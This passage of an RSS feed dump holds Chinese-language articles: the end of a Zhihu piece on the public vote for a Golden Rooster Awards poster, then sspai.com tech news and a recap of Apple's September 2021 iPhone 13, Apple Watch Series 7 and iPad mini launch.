data-original-src=\"v2-92c913635115a192738c0743d3f8ae8b\" data-watermark-src=\"v2-364fee3fd8e21107e5cfe5aa392ae43c\" data-private-watermark-src=\"v2-19c987afc89ddf2325f9004db3002aa3\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c43280be0ed0ad3c0de64514f96c6dfa_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"936\" data-rawheight=\"232\" data-watermark=\"original\" data-original-src=\"v2-c43280be0ed0ad3c0de64514f96c6dfa\" data-watermark-src=\"v2-c135bbe28cdf3e6ce54df38ea9bd6614\" data-private-watermark-src=\"v2-4d786c8904429e17c9434c789af2e308\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0bde47e2ee235ca723dd94a8b0bee12e_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"693\" data-rawheight=\"134\" data-watermark=\"original\" data-original-src=\"v2-0bde47e2ee235ca723dd94a8b0bee12e\" data-watermark-src=\"v2-e16b489d7abf8d90e65fd6873f24412f\" data-private-watermark-src=\"v2-16322a3f2606877ce362beea0b81469b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5537037be5866339544324b497f28489_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"490\" data-rawheight=\"56\" data-watermark=\"original\" data-original-src=\"v2-5537037be5866339544324b497f28489\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>微博截图除了在审美层面的争论之外，也有其他相关话题的讨论和争议：网友为它投票的理由是出于喜爱还是玩梗？作为中国电影金鸡奖这类严肃奖项的海报，它是否合适？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2509fb2d2f0568b095f5272461a24dc7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"686\" data-rawheight=\"111\" data-watermark=\"original\" data-original-src=\"v2-2509fb2d2f0568b095f5272461a24dc7\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-88e37d7479b23c07ebd9fb50c0c54051_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"107\" data-watermark=\"original\" data-original-src=\"v2-88e37d7479b23c07ebd9fb50c0c54051\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-78227f3228fe2af339754eae7ebb828c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"709\" data-rawheight=\"165\" data-watermark=\"original\" data-original-src=\"v2-78227f3228fe2af339754eae7ebb828c\" data-watermark-src=\"v2-40fda31cfd1c419329c87ff0198b3925\" data-private-watermark-src=\"v2-58c44c402c7b629d2677ed745bf13e7e\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef8bd8f55fc1086869f25ad93fdaf4d5_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"710\" data-rawheight=\"115\" data-watermark=\"original\" data-original-src=\"v2-ef8bd8f55fc1086869f25ad93fdaf4d5\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>许多网友从创新性、艺术性等角度阐释该设计的可取之处，解读作者的创作意图。随后，海报原作者其他作品在网络上的曝光，让“凝视鸡”的“出道”愈发合理，可以理解为一种不落俗套的个人风格展示。<br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-4b472564e1863c00b7cc379b5fa1b23f_720w.webp?rss\" data-caption=\"《雄鸡凝视》原作者Mr.Q作品\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1114\" data-watermark=\"original\" data-original-src=\"v2-4b472564e1863c00b7cc379b5fa1b23f\" data-watermark-src=\"v2-1599f486f19fb5c9665f25a4e84fc56f\" data-private-watermark-src=\"v2-be417df065ae66f2c0f0dc9cb63c75f6\"></p>\n<p><b>全民参与，聚力“雄鸡”出道</b></p>\n<p>往年金鸡奖海报给不少网友留下“土味”印象，2019年，网友在微博发起“金鸡奖民间海报大赛”，邀请各路高手拯救金鸡百花电影节的海报，呼吁大家伸出援手，救救这只“鸡”。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-def16323b3c15bfa249793b6857099b5_720w.webp?rss\" data-caption=\"微博截图\" data-size=\"normal\" data-rawwidth=\"1002\" data-rawheight=\"987\" data-watermark=\"original\" data-original-src=\"v2-def16323b3c15bfa249793b6857099b5\" data-watermark-src=\"v2-507b6d2bbef776b3ed76aa46948747bc\" data-private-watermark-src=\"v2-bb43e1d5307832d76d1696e0a890e585\"></p>\n<p>如今，金鸡奖海报迈出革新的步伐，首次采取<b>“全民参与”</b>的选拔形式，让网友实现从“监考官”到“阅卷人”的转变，10天时间里，<b>投票活动共吸引超过130万人次点击，累计投票数量突破166万。</b>对于网友来说，大众投票的确也为“民意”的整合和释放，提供了一条渠道。其中，网友为《雄鸡凝视》能够成功入选，纷纷投票点赞，甚至自发转发为其拉票<b>“你不我不投，雄鸡何时能出头”。</b>有些网友还将其作为自己每天的必做事项<b>“今天你为雄鸡投票了吗”。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-33e0f93fa0fc860866a14ed7394164da_720w.webp?rss\" data-caption=\"微博截图\" data-size=\"normal\" data-rawwidth=\"704\" data-rawheight=\"850\" data-watermark=\"original\" data-original-src=\"v2-33e0f93fa0fc860866a14ed7394164da\" data-watermark-src=\"v2-b40146effd0d3aabe3272f4937b687dc\" data-private-watermark-src=\"v2-b0b310be727385a7dba7f6f27bad9cd9\"></p>\n<p>如今《雄鸡凝视》能够C位出道，在《雄鸡凝视》的原作者Mr.Q看来，<b>所有为《雄鸡凝视》投票的人，某种程度上都是将一部分自己投射在了它的身上：</b>“它如今能被更多人知道，是因为每一个喜欢它、为它投票的人。某种程度上，它的每一片羽毛上都有大家的力量，我希望它的‘出道’能够鼓舞更多人，这是我的真心话。”《雄鸡凝视》引发网友火热讨论的背后，也代表着它符合大众对于电影节海报兼具创意审美和沟通共鸣的期待。电影节海报不能单单刻意追求“表”，更要追求“里”，既要有意思，又要有意义，不拘于传统，拥有包容的心态。艺术本该与众不同、有所创新，这幅别致的“雄鸡”也许正是老牌电影奖项向年轻文化靠拢的一次尝试。正如Mr.Q所言，“各种方式都可以尝试，正所谓‘一切皆有可能’。不必在头脑里把某种场合与某种模板绑定，打破禁锢，让表现方式丰富多彩也可以”。此次《雄鸡凝视》的C位出道并不意味着确定登上今年的“金鸡奖”官方海报，未来还要交由复审小组进行评判。最终是哪只“鸡”登上第34届中国电影金鸡奖海报，让我们拭目以待！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-wen-yi-wang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国文艺网</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483709218/answer/2121644349?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">14 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/357396570?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价第三十二届金鸡奖颁奖典礼及获奖名单？</a><br><a href=\"http://www.zhihu.com/question/301752692?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价2018年百花奖和金马奖的海报？</a><br>\n","link":"http://www.zhihu.com/question/483709218/answer/2121644349?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"派早报：iPhone 13 系列、Apple Watch Series 7、新款 iPad mini 等正式发布","date":"2021-09-15 00:50:44","description":"\n<h2><strong>你可能错过的新鲜事</strong></h2>\n<h3>iPhone 13 系列、Apple Watch Series 7、新款 iPad mini 等正式发布</h3>\n<p>Apple 于今天凌晨 1 点召开了秋季新品发布会，发布了全新的 iPhone 13 系列、iPhone 13 Pro 系列、Apple Watch Series 7 系列、iPad mini 和 iPad 等多款新品。iPhone 13 系列、iPhone 13 Pro 系列均配备了 A15 仿生芯片，包含了 2 个性能核心、4 个能效核心以及 16 核神经网络引擎，其中 iPhone 13 系列配备 4 核 GPU、iPhone 13 Pro 系列配备 5 核 GPU。容量从 128GB 起步，还有 256GB、512GB 可选，Pro 系列最高可选配 1TB。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/fe8b541cf12d2495f3614b30aec49f04\"><figcaption>iPhone 13 系列</figcaption></figure><p>外观方面，iPhone 13 后置双摄像头改为对角线式的对称设计，前置原深感摄像头的「刘海」区域面积降低 20%，提供经过全新设计的 5 种配色，分别是粉色、蓝色、午夜色、星光色以及红色。而 iPhone 13 Pro 系列提供了远峰蓝色、银色、金色和石墨色 4 种配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/d114ad0f145f447bbb442b3067c94639\"><figcaption>iPhone 13 Pro 系列</figcaption></figure><p>屏幕方面，13 和 13 Pro 系列均采用超磁晶面板的超视网膜 XDR 显示屏，iPhone 13 系列支持 800 尼特最大亮度，1200 尼特 HDR 峰值最大亮度，屏幕对比度达到 2000000:1。iPhone 13 Pro 系列不仅支持 1000 尼特最大亮度和 1200 尼特 HDR 峰值最大亮度，还支持 ProMotion 自适应刷新率功能，支持在 10Hz-120Hz 之间智能调整。</p>\n<p>相机方面，新款 iPhone 均支持电影效果模式、摄影风格以及智能 HDR 4 等功能。此外，iPhone 13 Pro 系列还支持微距模式和 ProRes 视频拍摄。</p>\n<p>续航方面，据官网提供的测试信息显示，iPhone 13 mini 相较前代产品续航时长增加了 1.5 小时，iPhone 13 的续航时长相较前代产品增加了 2.5 小时，iPhone 13 Pro 相较前代产品续航时长增加了 1.5 小时，iPhone 13 Pro Max 的续航时长相较前代产品增加了 2.5 小时。</p>\n<p>Apple Watch S7 系列则采用了全新的窄边框设计，边框收窄至 1.7 mm，尺寸升级为 41mm 和 45mm，屏幕亮度也在室内条件下有 70% 的提升，同时 Apple Watch Series 7 也优化了表盘设计，让显示屏可以得到充分利用。外观配色方面，Apple Watch S7 提供钛金属、不锈钢和铝金属三种机身选择；对于铝金属机身，将有绿色、蓝色、红色、星光色和午夜色五种新配色。此外充电速度也有了新提升，电量从零充至 80% 仅需约 45 分钟，续航和前代保持一致均为 18 小时。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/aad5af3c00635aadc7bb79ac77f5c560\"></figure><p>新款 iPad mini 采用了全新的窄边框设计，屏幕尺寸为 8.3 英寸，接口改为 USB-C 接口，传输速度为 5Gbps，无线方面支持 Wi-Fi 6 技术和 5G 网络。处理器和新 iPhone 一样采用了 A15 仿生处理器，且将 TouchID 移至顶部按钮处；此外新款 iPad mini 利用全新的 1200 万超大广角前置摄像头实现了和 iPad Pro 一致的人像居中功能。配色方面，全新 iPad mini 新增了粉色、紫色和星光色三种全新的配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/85b5f0a85670cab1ffe0cfc8e2319193\"></figure><p>iPad 也在本次发布会上有了例行升级，处理器升级为了 A13，支持了原彩显示和人像居中功能。基础价格保持不变的同时，容量翻倍至 64GB。</p>\n<p><strong>关联阅读</strong></p>\n<p><a href=\"https://sspai.com/post/68811/\" target=\"_blank\">你想要的高刷屏 iPhone、全面屏 iPad mini 都来了：Apple 发布会回顾</a></p>\n<p><a href=\"https://sspai.com/post/68812/\" target=\"_blank\">一图流 | 一张图带你看完 iPhone 13 发布会</a></p>\n<h3>罗技发布 G435 游戏耳机</h3>\n<p>9 月 14 日。罗技发布了 G435 无线游戏耳机，该耳机重量仅为 165 克，采用了蓝牙以及 USB Dongle 的方式进行连接，综合续航可达 18 小时，支持 USB-C 充电。G435 共提供三种配色方案，售价 80 美元。<a href=\"https://www.theverge.com/2021/9/14/22665355/logitech-g435-lightspeed-wireless-gaming-headset-features-price\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/1f6c4ac71f2fb0281e7ce8dc86b69281\"></figure><h3>工信部上线「一证通查」业务</h3>\n<p>9 月 14 日，工信部在网页端和支付宝小程序推出一证通查业务，用户通过输入自己的姓名和身份证，可以快速查询用户名下电话卡数量。<a href=\"https://getsimnum.caict.ac.cn/m/#/\" target=\"_blank\">来源</a></p>\n<h3>小米发布智能眼镜探索版</h3>\n<p>小米于 9 月 14 日发布了小米智能眼镜探索版，该智能眼镜在镜架处嵌入了 2.4mm x 2.02mm 的 MicroLED 显示屏，亮度峰值能达 200 万尼特，通过折射转化为大画面。同时内置四核心的 ARM 处理器，搭载独立的系统并可以通知讯息、骑行导航、提词并内置有 5MP 的相机，目前小米尚未公布具体的发售时间。<a href=\"https://cn.engadget.com/xiaomi-unveils-xiaomi-smart-glasses-concept-044843599.html\" target=\"_blank\">来源</a></p>\n<h3>三星推出 24 英寸 Webcam Monitor S4 显示器</h3>\n<p>三星于 9 月 14 日正式推出了 24 寸 Webcam Monitor S4 显示器，屏幕部分采用了 24 英寸，1920 ×1080 分辨率的 IPS 面板，拥有 178° 水平/垂直视角、亮度 250 cd/㎡、对比度 1000：1（典型值）、灰阶响应 5-ms、支持最大 75Hz 刷新率。该显示器集成了摄像头以及麦克风组件，摄像头为 200 万像素，支持 Windows hello 解锁，采用隐藏式设计可以在使用时点击弹出，另外有一对 2W 的立体声扬声器，端口上支持 HDMI + DisplayPort + D-Sub 信号输入，以及音频输出，目前已经在美国、欧洲、韩国已经东南亚上市。<a href=\"https://www.neowin.net/news/samsung-introduces-webcam-monitor-s4-for-hybrid-workers/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/a9332350c2b613420fe3fe39813f3328\"></figure><h3>雷蛇发布幻影战狼 V2 游戏手柄</h3>\n<p>9 月 14 日，雷蛇正式发布幻影战狼 V2 幻彩版游戏手柄，该产品适用于 Xbox 主机设备。除基础的游戏按键以外，还提供了 6 个额外的功能按键，以及 3.5mm 耳机接口。目前设备已开启预售，售价价 1199 元。<a href=\"https://www.razer.com/hk-zh/console-controllers/razer-wolverine-v2-chroma\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/article/d21c85ec8a16d0aae97dcc8a6e54c478\"></figure><h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购<strong>六折</strong>优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<strong>📒 </strong>集合 Markdown、看板、标签等功能于一身的「<a href=\"https://sspai.com/item/276\" target=\"_blank\">大师笔记</a>」，教师节特惠最后几小时。</li>\n<li>🎁 会员周边已经陆续完成打包发货，请会员用户留意短信通知。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📡 你会在日常生活中使用 5G 网络吗？去 <a href=\"https://sspai.com/bullet/1630048406\" target=\"_blank\">一派</a> 和大家聊聊。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单</a>，Kindle 商店电子书版也已上架。</li>\n</ul>\n<h2><strong>你可能错过的文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68678\" target=\"_blank\">Ulysses 与 Zotero 的梦幻工作流，轻松搞定参考文献</a></li>\n<li><a href=\"https://sspai.com/post/68721\" target=\"_blank\">个人网站 / 博客必备，零成本、低门槛创建专属数据分析工具：umami.is</a></li>\n<li><a href=\"https://sspai.com/post/68761\" target=\"_blank\">从原理出发，寻找适合你的那一部——无反相机选购指南</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol07-their-note-taking-methodology\" target=\"_blank\">从手写到 Roam Research，他们在用这些别致的笔记方法论</a></li>\n<li><a href=\"https://sspai.com/post/68762\" target=\"_blank\">少数派会员迎来大更新，福利促销正式开启</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68814"},{"title":"一图流｜一张图带你看完 Apple 2021 年秋季新品发布会","date":"2021-09-14 22:44:19","description":"\n<p>今天凌晨，Apple 通过在线直播的形式召开了 2021 年秋季新品发布会。Apple 在本届发布会上推出了 iPhone 13 及 13 Pro 系列手机、新款 iPad mini、新款 iPad、Apple Watch Series 7 等产品。如果你没有熬夜看发布会，不用担心，少数派不仅整理了发布会的详细回顾文章，还连夜赶制了发布会要点的一图流，让你用最简单直观的方式迅速了解本届 Apple 新品发布会的完整动态。</p>\n<p>👉 <a href=\"https://sspai.com/post/68811\" target=\"_blank\">Apple 2021 秋季新品发布会完整回顾文章</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/70d30a084222dff6c9c746a10d514631.jpeg\"></figure><p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68812"},{"title":"你想要的高刷屏 iPhone、全面屏 iPad mini 都来了：Apple 发布会回顾","date":"2021-09-14 21:11:33","description":"\n<p>今天凌晨，Apple 正式举行发布会，发布 iPhone 13 系列、Apple Watch Series 7、iPad mini 等多款新品。其中，iPhone 13 Pro 系列正式支持 ProMotion 高刷新率屏幕，推出远峰蓝新配色；iPad mini 更换 USB-C 接口，采用全面屏设计，支持二代 Apple Pencil 等。</p>\n<p>如果你没有熬夜看发布会，少数派为你整理了发布会要点，还连夜赶制了发布会要点的信息图，让你用最简单直观的方式迅速了解新款设备。 </p>\n<p>👉 <a href=\"https://sspai.com/post/68812\" target=\"_blank\">一图流 | 一张图带你看完 iPhone 13 发布会</a></p>\n<h2>iPhone 13 系列：更小的「刘海」，更好的相机</h2>\n<p>今年的 iPhone 13 系列依旧分为 iPhone 13 和 iPhone 13 mini 2 款机型，除了外观、配色方面的变化，芯片、摄像头、电池续航等也都有不同程度的升级。</p>\n<p>外观方面，iPhone 13 系列的设计与前代无较大差异，后置双摄像头改为对角线式的对称设计，前置原深感摄像头的「刘海」区域面积降低 20%，提供经过全新设计的 5 种配色，分别是粉色、蓝色、午夜色、星光色、红色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6sdb34tdhj3i1e60.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPhone 13</figcaption></figure><p>iPhone 13 系列依然搭载的是采用超瓷晶面板的超视网膜 XDR 显示屏，屏幕尺寸分别为 5.4 和 6.1 英寸，支持 IP68 防溅、抗水、防尘等级。显示效果方面，iPhone 13 系列支持 800 尼特最大亮度，1200 尼特 HDR 峰值最大亮度，屏幕对比度达到 2000000:1。</p>\n<p>相机方面，iPhone 13 系列配备了 1200 万像素广角和超广角后置镜头，广角镜头新增了传感器位移式光学图像防抖功能，能够在拍摄时提供更好的防抖效果；进光量增加 47%。</p>\n<p>视频拍摄方面，iPhone 13 系列推出了全新的电影效果模式，能够在拍摄时智能自动地切换画面焦点，设备还将能够预判即将入镜的画面主体，实现更加即使的焦点切换效果。这项功能也支持在拍摄完成之后，由用户手动更改和调整不同画面中的焦点和虚化效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6slb34tdhtodstr0.gif\"><figcaption>「电影效果」支持自动智能切换焦点</figcaption></figure><p>拍照方面，最新的智能 HDR 4 功能能够在一个场景中识别最多 4 位人物，并根据不同人物的肤色、位置光线等条件，针对性地调整各自的显示效果。在中地光场景中，智能 HDR 4 还会启用深度融合技术，分析多次曝光画面中的各个像素，让照片保留更多画面细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/15/ddd25c91482d3b07cacc2d0e830a7794.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>智能 HDR 4 官方样张</figcaption></figure><p>iPhone 13 系列还推出了一项名为「摄影风格」的新功能，「摄影风格」提供了「标准」「高对比度」「高饱和度」「冷色调」「暖色调」5 种风格预设，除了「标准」风格，其余风格预设均支持手动调整色调和色温。设置好摄影风格之后，相机会智能地将相应色调和色温的设置应用到照片局部，同时保持人物肤色等的自然表现。「摄影风格」中提供的预设只需要设定一次，之后采用该风格拍摄的照片都会自动应用之前设置好的参数。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6ttb34tdhtodstrg.gif\"><figcaption>摄影风格</figcaption></figure><p>前置原深感摄像头方面，除了面积降低 20%，也配备了与后置摄像头一致的电影效果、摄影风格、智能 HDR 4、夜间模式等功能。</p>\n<p>续航方面，据官网提供的测试信息显示，iPhone 13 mini 相较前代产品续航时长增加了 1.5 小时，iPhone 13 的续航时长相较前代产品增加了 2.5 小时。</p>\n<p>iPhone 13 系列在存储容量上也较前代产品有所提升，提供 128GB、256GB、512GB 可选。售价方面，iPhone 13 mini 的售价分别为 ¥5,199 (128GB)、¥5,999 (256GB)、¥7,599 (512GB)；iPhone 13 的售价分别为 ¥5,999 (128GB)、¥6,799 (256GB)、¥8,399 (512GB)。iPhone 13 和 iPhone 13 mini 将于 9 月 17 日本周五晚 8 点开启预购，9 月 24 日下周五正式发售。</p>\n<h2>iPhone 13 Pro 系列：ProMotion 高刷屏，还有专业级摄影功能</h2>\n<p>与 iPhone 13 系列一样，iPhone 13 Pro 系列拥有更小的原深感摄像头「刘海」区域，配备超瓷晶面板，支持 IP68 级防溅、抗水、防尘。配色方面，iPhone 13 Pro 系列提供了远峰蓝色、银色、金色和石墨色 4 种配色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6udb34tdhn8pbntg.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPhone 13 Pro</figcaption></figure><p>屏幕方面，ProMotion 自适应刷新率首次来到了 iPhone 上。iPhone 13 Pro 系列上的 ProMotion 自适应刷新率功能支持在 10Hz 至最高 120Hz 之间进行智能调整。比如，当浏览屏幕内容静止不动时，屏幕会自动切换至低刷新率运行，当滑动屏幕查看内容或者玩游戏时，屏幕又会动态调整至高刷新率运行，最高可达 120Hz。亮度方面，iPhone 13 Pro 系列支持 1000 尼特最大亮度，1200 尼特 HDR 峰值最大亮度，屏幕对比度达到 2000000:1。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6ulb34tdhj3i1e6g.gif\"><figcaption>ProMotion 显示屏</figcaption></figure><p>性能方面，iPhone 13 Pro 系列搭载的 A15 仿生芯片拥有 6 核 CPU 中央处理器 (2 颗性能核心 + 4 颗能效核心)、5 核 GPU 图形处理器 (iPhone 13 系列为 4 核 GPU)，新的 16 核神经网络引擎可以用于驱动电影效果、智能 HDR 4 等功能。</p>\n<p>相机方面，在具有与 iPhone 13 系列一致的电影效果 (广角、长焦、原深感镜头)、摄影风格、智能 HDR 4 等功能的基础上，iPhone 13 Pro 系列还有多项升级。首先是微距模式，经过重新设计的超广角镜头支持对焦拍摄距离最近为 2 厘米的物品，这项功能同样可以用于视频拍摄、慢动作和延时摄影拍摄中。</p>\n<p>iPhone 13 Pro 系列采用了 ƒ/1.5 光圈的广角镜头，光线捕捉能力提升了 2.2 倍，支持传感器位移式光学防抖功能；超广角镜头方面，ƒ/1.8 光圈的镜头光线捕捉能力提升了 92%；77 毫米的长焦镜头不仅支持 3 倍光学变焦，也终于加入了夜间模式。</p>\n<p>视频拍摄方面，iPhone 13 Pro 系列推出了 ProRes 视频格式，让视频具有更高的色彩保真度和低压缩度，ProRes 格式视频也能导入至 macOS 上的 Final Cut Pro 应用，进行更加专业的剪辑处理。ProRes 视频格式将于今年晚些时候正式推出，前置原深感镜头将同样支持这项功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6utb34tdhtodsts0.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>ProRes</figcaption></figure><p>续航方面，据官网提供的测试信息显示，iPhone 13 Pro 相较前代产品续航时长增加了 1.5 小时，iPhone 13 Pro Max 的续航时长相较前代产品增加了 2.5 小时。存储容量方面，除了与 iPhone 13 系列一致的 128GB、256GB、512GB 选项，iPhone 13 Pro 系列还提供了最高达 1TB 的存储容量选项。</p>\n<p>价格方面，iPhone 13 Pro 的价格分别为：</p>\n<ul>\n<li>¥7,999 (128GB)</li>\n<li>¥8,799 (256GB)</li>\n<li>¥10,399 (512GB)</li>\n<li>¥11,999 (1TB)</li>\n</ul>\n<p>iPhone 13 Pro Max 的售价分别为：</p>\n<ul>\n<li>¥8,999 (128GB)</li>\n<li>¥9,799 (256GB)</li>\n<li>¥11,399 (512GB)</li>\n<li>¥12,999 (1TB)</li>\n</ul>\n<p>iPhone 13 Pro 和 iPhone 13 Pro Max 将于 9 月 17 日本周五晚 8 点开启预购，9 月 24 日下周五正式发售。</p>\n<h2>iPad mini：更好的全面显示屏、A15 芯片……该有的都有了</h2>\n<p>新款 iPad mini 升级了类似 iPad Pro 的全面屏外观设计，屏幕尺寸为 8.3 英寸，上一代为 7.9 英寸，接口改为了 USB-C 接口，传输速度为 5Gbps，无线方面支持 Wi-Fi 6 技术和 5G 网络。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vdb34tdhopdm70g.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>支持 USB-C 接口</figcaption></figure><p>新款 iPad mini 屏幕采用了 Liquid 视网膜屏幕，支持原彩显示、P3 广色域，最高亮度为 500 尼特，且配备了横向立体声扬声器。配色方面，除去深空灰以外，本次 iPad mini 新增了粉色、紫色和星光色三种全新的配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vlb34tdhj3i1e70.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>iPad mini</figcaption></figure><p>新款 iPad mini 同样配备了 A15 仿生芯片，比上一代性能提升高达 80%。但继续采用的是 Touch ID 技术，传感器和 iPad Air 4 一样与电源按键进行了集成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c50g6vtb34tdhtodstsg.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>电源键集成 Touch ID</figcaption></figure><p>新款 iPad mini 利用全新的 1200 万超大广角前置摄像头实现了和 iPad Pro 一致的人像居中功能，这项功能会自动调整摄像头并跟随用户移动，使用户始终位于画面中央，当有新用户加入时则会逐渐放大取景区域，让所有人都出现在画面中。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g70db34tdhn8pbnug.gif\"><figcaption>人物居中</figcaption></figure><p>新款 iPad mini 后置摄像依然为单摄，但从 800 万像素升级到了 1200 万像素，和 iPad Air 4 的摄像头一致，但利用 A15 仿生芯片可以实现智能 HDR 功能，提升画面阴影和高光的细节并提高画面质量。</p>\n<p>配件方面，新款 iPad mini 支持第二代 Apple Pencil 和一款智能双面夹保护壳，支持开盖唤醒和合盖休眠的功能，智能双面夹保护壳将提供黑色、白色、绛樱桃色、英伦薰衣草色和亮光橙色 5 款颜色。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c50g715b34tdhopdm710.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"><figcaption>智能双面夹</figcaption></figure><p>新款 iPad mini 有 64GB 和 256GB 两个版本可选，将于 9 月 16 日上午 9 点开始预购、9 月 24 日正式发售，售价分别为：</p>\n<ul>\n<li>64GB (Wi-Fi 版)：¥3,799</li>\n<li>256GB (Wi-Fi 版)：¥4,999</li>\n<li>64GB (蜂窝数据版)：¥4,999</li>\n<li>256GB (蜂窝数据版)：¥6,199</li>\n</ul>\n<h2>iPad：常规升级，加量不加价</h2>\n<p>除了 iPad mini，Apple 也例行更新了平价款的 10.2 英寸第九代 iPad。配置方面从去年搭载的 A12 处理器升级为了 A13 处理器，比第八代 iPad 性能提升达 20%，屏幕也首次支持原彩显示，前置摄像头则升级为了 1200 万超广角摄像头。</p>\n<p>本次更新中最引人注目的是新款 iPad 同样支持和 iPad 